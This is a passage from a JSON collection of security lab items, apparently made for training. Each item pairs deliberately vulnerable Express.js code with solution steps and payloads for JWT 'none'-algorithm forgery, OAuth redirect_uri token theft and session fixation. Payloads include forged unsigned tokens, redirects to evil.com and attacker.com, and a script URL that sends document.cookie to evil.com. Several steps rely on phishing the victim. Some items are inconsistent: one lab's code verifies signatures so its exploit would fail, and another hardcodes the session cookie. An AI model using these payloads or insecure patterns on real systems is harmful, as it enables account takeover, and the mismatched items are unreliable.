    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const user = users.find(u => u.username === decoded.payload.username); if (!user) return res.status(403).send('Access Denied'); res.send(`Account details for ${user.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens",
    "Lab Description": "The application implements session tokens that are not regenerated upon login and are derived from predictable values such as timestamps or usernames. The attacker can fix a session identifier before login. To solve: Create a session for Carlos before he logs in, then access his account once he authenticates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to initiate a GET /login request without credentials and note the Set-Cookie header containing a session ID.",
      "2. Send the session cookie value to Carlos via phishing or assume he's logged in using the same predictable session ID.",
      "3. Once Carlos logs in using the fixed session, reuse the same session cookie in your browser.",
      "4. Send a GET /my-account request with that session cookie.",
      "5. Observe if access is granted to Carlos's authenticated session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || 'sess-' + new Date().getTime(); res.cookie('session', sessionId); res.send('<form method=post><input name=username><input name=password></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; if (users[username] === password) { sessions[sessionId] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome ${user}, this is your account page.`); } else { res.send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=sess-1713100000000",
      "Cookie: session=sess-guest-session"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI trust",
    "Lab Description": "This lab simulates a misconfigured OAuth flow where the application does not properly validate the redirect URI, allowing open redirection and token leakage. Attackers can supply their own redirect URI to capture access tokens issued to another user. To solve: Exploit the OAuth flow to steal an access token for user 'carlos' and use it to access their protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth authorization request to /auth?redirect_uri=...",
      "2. Modify the redirect_uri parameter to point to your Burp Collaborator or webhook.site endpoint.",
      "3. Trick Carlos into clicking the manipulated OAuth login URL via social engineering.",
      "4. Capture the token in your endpoint logs and extract the access_token parameter.",
      "5. Send a GET request to /my-account with Authorization: Bearer <stolen_token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (!redirect_uri || !client_id || response_type !== 'token') return res.status(400).send('Invalid OAuth request'); const accessToken = 'token-carlos-abc123'; res.redirect(`${redirect_uri}#access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos-abc123') res.send('Welcome carlos. This is your protected data.'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://attacker.site/capture&response_type=token",
      "Authorization: Bearer token-carlos-abc123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
    "Lab Description": "This lab implements JWT-based authentication using the `alg` field in the token header to determine the algorithm dynamically. The application fails to properly validate this value, allowing an attacker to forge a valid token using `alg: none`. To solve: Forge a token that grants access to Carlos’s account using algorithm confusion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or Postman to intercept a login request and retrieve your JWT token from the Set-Cookie header.",
      "Decode the token using jwt.io and observe the algorithm in the header (e.g., HS256) and payload structure.",
      "Replace the algorithm field in the token header with `none`, and remove the signature section.",
      "Modify the payload to impersonate user `carlos`.",
      "Resend the forged JWT in the Authorization header or as a cookie and access the /my-account endpoint to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { carlos: 'admin', wiener: 'user' }; app.get('/login', (req, res) => { const { username } = req.query; if (users[username]) { const token = jwt.sign({ user: username, role: users[username] }, 'secret', { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in'); } else { res.status(403).send('User not found'); } }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0"
    ]
  },
  {
    "Lab scenario": "OAuth redirect manipulation for token leakage",
    "Lab Description": "This lab integrates third-party OAuth for login and uses the `redirect_uri` parameter to navigate users post-authentication. The application fails to validate this URI properly. To solve: Manipulate the redirect_uri to leak Carlos's OAuth token to your controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the login flow and identify the OAuth authorization request with `redirect_uri` parameter.",
      "Modify the `redirect_uri` to point to your controlled domain (e.g., https://evil.com/callback).",
      "Complete the login process using Carlos's OAuth credentials or initiate it on their behalf if tokens are URL-bound.",
      "Capture the authorization code or access token on your domain.",
      "Use the stolen token in a request to the app's /my-account endpoint to gain access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/callback', (req, res) => { const code = req.query.code; const redirect_uri = req.query.redirect_uri; request.post('https://oauth.example.com/token', { form: { code, client_id: 'client123', client_secret: 'secret', redirect_uri } }, (err, response, body) => { const token = JSON.parse(body).access_token; res.cookie('access_token', token); res.redirect(redirect_uri); }); }); app.get('/my-account', (req, res) => { const token = req.cookies.access_token; if (token === 'admin-oauth-token') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://evil.com/callback",
      "https://evil.com?code={authCode}",
      "https://evil.com/callback?token={accessToken}"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application assigns session tokens before authentication and does not generate a new session upon successful login. This allows an attacker to fix a session ID for a victim. To solve: Set a session ID, trick Carlos into logging in, then reuse the same session ID to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to initiate a session by accessing the login page and capture the session cookie (e.g., session=abc123).",
      "Send the session ID to the victim (Carlos) via phishing or an embedded link containing the fixed session cookie.",
      "Wait for Carlos to log in while using the session ID you set.",
      "Once logged in, reuse the same session cookie to access the /my-account page as Carlos.",
      "Verify access to Carlos's account and confirm exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weak', resave: true, saveUninitialized: true })); const users = { carlos: 'securepass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(5000);",
    "payloads": [
      "session=fixatedSession123",
      "Set-Cookie: session=fixatedSession123",
      "GET /my-account HTTP/1.1\nCookie: session=fixatedSession123"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass in stateless session handling",
    "Lab Description": "This lab demonstrates a JWT validation flaw caused by the server not verifying the token's algorithm. The application accepts JWTs as bearer tokens to manage authentication. However, it does not verify whether the signature algorithm is secure. To solve: Modify and forge a JWT token that grants access to Carlos’s protected account page without knowing the original secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman or Burp Suite to capture a legitimate JWT from your account login.",
      "2. Decode the JWT using jwt.io or any JWT decoder and note the header and payload structure.",
      "3. Modify the 'alg' field in the JWT header from 'HS256' to 'none'. Remove the signature.",
      "4. In the payload, change 'username' to 'carlos' and re-encode the token without a signature.",
      "5. Use the tampered JWT as a Bearer token in the Authorization header to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { carlos: { role: 'admin' }, wiener: { role: 'user' } }; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); res.send(`Welcome ${decoded.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect abuse",
    "Lab Description": "The application integrates with a third-party OAuth provider for authentication. Due to poor redirect URI validation, it is vulnerable to open redirect abuse, allowing attackers to intercept authorization codes. To solve: Exploit the misconfigured redirect URI to capture Carlos's OAuth token and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to initiate OAuth login flow and intercept the GET request to /auth/redirect?next=[URL].",
      "2. Modify the next parameter to redirect to your malicious server (e.g., http://evil.com/callback).",
      "3. Host a listener on your server to capture the authorization code sent from the provider.",
      "4. Use the captured code with curl or Postman to manually redeem the token.",
      "5. Use the token in the Authorization header to impersonate Carlos and access /account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/redirect', (req, res) => { const next = req.query.next || '/home'; res.redirect(`https://oauth-provider.com/auth?client_id=123&redirect_uri=${next}`); }); app.get('/callback', (req, res) => { const { code } = req.query; res.send('OAuth code received: ' + code); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://target.com/auth/redirect?next=http://evil.com/callback",
      "https://target.com/auth/redirect?next=https://evil.com/oauth/code",
      "https://target.com/auth/redirect?next=data:text/html,<script>location='http://evil.com?c='+document.cookie</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens",
    "Lab Description": "This lab uses predictable session tokens vulnerable to fixation. The server does not regenerate session identifiers upon authentication, allowing an attacker to set a known token and trick a victim into using it. To solve: Set a session token, trick Carlos into logging in with it, then reuse the token to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or browser dev tools to inspect the cookie during unauthenticated browsing. Note the token format.",
      "2. Generate a custom session token manually using the same predictable pattern (e.g., static prefix + timestamp).",
      "3. Set this token in your browser cookies or with Postman and send Carlos a phishing link using this session.",
      "4. After Carlos logs in via the phishing link, reuse the same session ID in a new request to /dashboard.",
      "5. Confirm access to Carlos’s session by verifying his username or settings page content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'carlospass', wiener: 'wienerpass' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; if (users[username] === password) { const sessionId = req.cookies.session || `sess_${Date.now()}`; sessions[sessionId] = username; res.cookie('session', sessionId); res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Dashboard for ${user}`); } else { res.send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "sess_1710000000000",
      "sess_1701234567890",
      "sess_1699999999999"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof using 'none' algorithm",
    "Lab Description": "This lab is vulnerable to JWT tampering due to improper validation of the token algorithm field. The application accepts tokens signed using the 'none' algorithm without verifying their authenticity. To solve: forge a token that grants administrative access to Carlos’s account without knowing the signing secret.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT after a valid login and decode it using jwt.io.",
      "Observe the 'alg' field in the header; confirm it's set to 'HS256'. Replace this with 'none'.",
      "Remove the signature segment of the token, keeping only the base64-encoded header and payload.",
      "Modify the payload to change the username field to 'carlos' and set admin=true.",
      "Send the modified token in the Authorization header using Postman and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, admin: false }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos' && payload.admin) { return res.send('Welcome Carlos - Admin Access'); } res.status(403).send('Forbidden'); } catch (err) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Tampering Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ.",
      "Authorization: Bearer [token]",
      "{ \"alg\": \"none\" } header + { \"username\": \"carlos\", \"admin\": true } payload"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect misconfiguration",
    "Lab Description": "The application uses a third-party OAuth provider for login, but does not properly validate redirect URIs. An attacker can exploit this to capture tokens or impersonate a user. To solve: manipulate the redirect_uri parameter to steal Carlos’s token and access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate an OAuth login flow and capture the GET request to /oauth/authorize.",
      "Modify the redirect_uri parameter to an attacker-controlled domain that logs the access token.",
      "Send the modified URL to Carlos (social engineering assumed).",
      "Use captured token from the attacker domain and attach it in an Authorization: Bearer header.",
      "Access /my-account as Carlos and verify token grants access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('querystring'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const tokenRes = await axios.post('https://oauth-provider.com/token', qs.stringify({ code, redirect_uri }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }); const accessToken = tokenRes.data.access_token; res.redirect(`${redirect_uri}?token=${accessToken}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token-123') { return res.send('Welcome Carlos!'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/oauth/callback?code=abc&redirect_uri=https://attacker.com/capture",
      "Authorization: Bearer carlos-token-123",
      "https://attacker.com/capture?token=carlos-token-123"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-set cookie",
    "Lab Description": "The application fails to regenerate the session ID after authentication. An attacker can set a session ID for the victim, then trick them into logging in with it. This allows session hijacking. To solve: set a session cookie for Carlos, wait for login, then reuse it to access the account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a GET request with a custom session ID: Cookie: session=attack-session.",
      "Trick Carlos into clicking a crafted login link with the session cookie preset (e.g., via email).",
      "Carlos logs in, binding his account to 'attack-session'.",
      "Replay the session by reusing 'attack-session' as the cookie value.",
      "Access /my-account and confirm session fixation success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'supersecure' }; app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] === 'carlos') { return res.send('Welcome back Carlos'); } res.status(403).send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=attack-session",
      "POST /login with session=attack-session and Carlos credentials",
      "GET /my-account with Cookie: session=attack-session"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in Authorization Header",
    "Lab Description": "This lab has an authentication mechanism based on JWTs which are stored and verified insecurely. The application decodes the JWT but fails to validate its signature. This allows a user to modify the token payload and gain unauthorized access. To solve: Tamper with a JWT to escalate privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a request containing the JWT using Burp Suite and inspect the Authorization header.",
      "Decode the JWT at jwt.io and confirm that the signature is either 'none' or not validated server-side.",
      "Modify the payload to set \"role\": \"admin\" and set the alg header to \"none\".",
      "Remove the signature entirely and re-encode the header and payload using base64url.",
      "Replace the original token in the Authorization header and send a GET request to /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', role: 'user' }]; app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to the admin panel'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Tampering Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in Cookie",
    "Lab Description": "This lab's session management is vulnerable due to the use of predictable session identifiers that are not regenerated after login. The application uses static session tokens which remain valid after authentication, allowing an attacker to fix a session ID for the victim. To solve: Set a known session ID, trick the victim into logging in, then hijack the session and access the account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a GET request to initiate a session and capture the Set-Cookie header using Burp Suite.",
      "Manually set a known session ID (e.g., session=attacker123) using Postman or Burp.",
      "Send the crafted link with the known session ID to the victim (simulated in lab setup).",
      "After the victim logs in, reuse the same session ID in your browser.",
      "Send a GET /account request with the known cookie to access the victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.use((req, res, next) => { let sid = req.cookies.session; if (!sid) { sid = req.query.sid || Math.random().toString(36).substring(2); res.cookie('session', sid); } req.sessionID = sid; next(); }); app.post('/login', (req, res) => { const { username } = req.body; sessions[req.sessionID] = { username }; res.send('Logged in'); }); app.get('/account', (req, res) => { const user = sessions[req.sessionID]; if (user) res.send(`Account page of ${user.username}`); else res.send('Not logged in'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "session=attacker123",
      "session=sharedToken42",
      "session=testsession001"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration vulnerability in redirect_uri",
    "Lab Description": "This lab features a misconfigured OAuth flow that fails to validate redirect_uri strictly, allowing an attacker to intercept tokens by exploiting open redirect behavior. The application integrates with an OAuth provider for authentication. To solve: Exploit the misconfiguration to capture Carlos’s access token via an attacker-controlled domain.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate the OAuth flow and observe the redirect_uri parameter using Burp Suite.",
      "Modify redirect_uri to an attacker-controlled domain while preserving the base domain.",
      "Host a simple token-stealing page that logs query parameters (e.g., access_token).",
      "Send the malicious link to the victim (simulated within lab).",
      "Access the captured token from logs and replay it to impersonate the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokenStore = { 'carlos': 'abcd123token' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const accessToken = tokenStore['carlos']; const redirectUrl = `${redirect_uri}?access_token=${accessToken}&state=${state}`; res.redirect(redirectUrl); }); app.get('/profile', (req, res) => { const token = req.query.access_token; if (token === tokenStore['carlos']) res.send('Carlos Profile Page'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/capture",
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/oauth-callback",
      "https://vulnerable.app/oauth/authorize?redirect_uri=https://attacker.com/redirect&state=xyz"
    ]
  },
  {
    "Lab scenario": "JWT tampering to escalate privileges in API access",
    "Lab Description": "This lab features a RESTful API that uses JWTs for authentication. The backend accepts unsigned JWTs due to a missing verification check. The application uses the 'role' claim to restrict access to administrative endpoints. To solve: forge a JWT granting admin access and retrieve the sensitive data from the /admin/report endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture JWT using Burp Suite when logged in as a normal user",
      "Send token to jwt.io or use jwt_tool to inspect token structure and verify the 'alg' header is set to 'none'",
      "Modify the payload to { \"username\": \"carlos\", \"role\": \"admin\" } and set alg to 'none'",
      "Remove the signature entirely, rebase64 the header and payload, and reconstruct the JWT",
      "Send request to /admin/report with the forged token in Authorization header to access protected resource"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/api/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'none' }); res.json({ token }); }); app.get('/admin/report', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token); if (payload.role === 'admin') { res.send('Sensitive admin report data'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation in login redirection flow",
    "Lab Description": "The application uses a session cookie to manage authenticated users, but fails to issue a new session identifier upon successful login. An attacker can preset a session ID for the victim, then trick them into authenticating with it. To solve: hijack Carlos’s session by forcing him to log in using a fixed session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start a session with a custom session ID using Burp (e.g., Cookie: session=attacker123)",
      "Browse to the login endpoint and log in using your own credentials with the crafted session ID",
      "Send the session URL to Carlos (e.g., /login?redirect=/my-account with cookie=session=attacker123)",
      "Wait for Carlos to log in; session cookie remains attacker123 due to missing regeneration",
      "Use the same session cookie (attacker123) to access /my-account as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: { password: 'secret123' } }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username].password === password) { res.send('Logged in'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.cookies.session === 'attacker123') { res.send('Welcome Carlos, here is your account'); } else { res.send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Cookie: session=attacker123",
      "/login?username=carlos&password=secret123",
      "/my-account with Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referrer header",
    "Lab Description": "The application uses an OAuth 2.0 implicit flow and places access tokens in the URL fragment. However, a redirect to a third-party domain causes the access token to leak via the Referer header. To solve: capture Carlos’s token via a malicious redirect and use it to access his data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login flow and observe token returned in URL fragment (e.g., #access_token=xyz)",
      "Craft a redirect_uri to attacker.com/capture that causes the browser to send the Referer with the full URL",
      "Send phishing link to Carlos containing redirect_uri=https://attacker.com/capture",
      "Set up HTTP listener on attacker.com to capture Referer with access token",
      "Use captured access token in Authorization header to call /api/user-data as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { res.send(`<script>window.location='https://attacker.com/capture#' + window.location.hash.substr(1);</script>`); }); app.get('/api/user-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-access-token') res.send('Carlos private data'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "https://target.com/oauth/callback#access_token=carlos-access-token",
      "Referer: https://target.com/oauth/callback#access_token=carlos-access-token",
      "Authorization: Bearer carlos-access-token"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in login endpoint",
    "Lab Description": "The application's login mechanism uses JSON Web Tokens for session management but fails to validate the algorithm field properly. The application blindly trusts tokens signed with 'none' as valid. To solve: gain access to Carlos's account by forging a valid token without knowing the secret.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept a login request and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or Burp Decoder and observe the algorithm value in the header is set to HS256.",
      "Modify the algorithm to 'none' and remove the signature portion of the token.",
      "Change the payload section to {\"username\":\"carlos\"} and re-encode the token with no signature.",
      "Replay the request with the forged JWT in the Authorization header and access the /my-account endpoint to verify success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'topsecret'; const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Unauthorized'); const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') res.send('Welcome carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Lab running...'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via redirect URI",
    "Lab Description": "This lab's OAuth implementation uses an implicit grant flow that leaks the access token in the redirect URI. The application does not sanitize or securely handle fragment identifiers, allowing an attacker to steal tokens via referer headers. To solve: extract Carlos's token and use it to access his protected profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to proxy a login via OAuth and capture the redirection URI that includes the access token.",
      "Observe that the access token appears in the URL fragment (e.g., #access_token=XYZ).",
      "Inject a redirect URI during the OAuth handshake that points to your attacker server and logs the fragment token.",
      "Once Carlos logs in via the crafted link, intercept the token on your server via HTTP referer or browser-side script.",
      "Use the stolen token in an Authorization header to access /user/profile and retrieve Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'carlos-oauth-token-abc123'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token-abc123') res.send('Carlos Profile'); else res.status(403).send('Access denied'); }); app.listen(4001, () => console.log('OAuth Token Leak Lab running...'));",
    "payloads": [
      "https://attacker.com/callback#access_token=carlos-oauth-token-abc123",
      "Authorization: Bearer carlos-oauth-token-abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in change-password endpoint",
    "Lab Description": "The application assigns a new session cookie upon login, but the session is not properly regenerated after sensitive operations. This allows an attacker to fix a session ID before victim login. To solve: set a session for Carlos before he logs in and hijack his session after he changes his password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Postman, initiate a GET /session with a custom session ID and send it to the victim via social engineering.",
      "Once the victim logs in, reuse the same session cookie to validate it has been fixed.",
      "Capture the request when the victim changes their password — session ID remains unchanged.",
      "Replay the session cookie in your browser or client to hijack the victim's session.",
      "Access /my-account with the hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
